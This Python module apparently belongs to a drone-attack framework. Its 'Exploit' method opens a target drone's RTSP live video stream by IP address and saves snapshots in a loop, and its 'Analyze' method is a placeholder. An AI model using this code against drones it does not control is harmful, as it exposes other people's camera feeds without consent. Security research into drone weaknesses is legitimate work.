import vlc
import time

from ..DroneModuleFrame import DroneModuleFrame

class DroneModule(DroneModuleFrame):
    def __init__(self):
        name = "Stream Drones RTSP Stream"
        options = {'ip': {'value': '127.0.0.1', 'description': 'The IP address of the drone'},
                    'stream': {'value': True, 'description': 'Stream output'}}
        DroneModuleFrame.__init__(self, name, options)


    def Analyze(self):
        print("I am analyzing stuff")

    def Exploit(self):
        player=vlc.MediaPlayer('rtsp://{}/live'.format(self.options['ip']['value']))
        player.play()
        if not self.options['stream']['value']:
            player.video_take_snapshot(0, 'snapshot.tmp.png', 0, 0)
        else:
            while True:
                player.video_take_snapshot(0, 'snapshot.tmp.png', 0, 0)
                time.sleep(0.5)
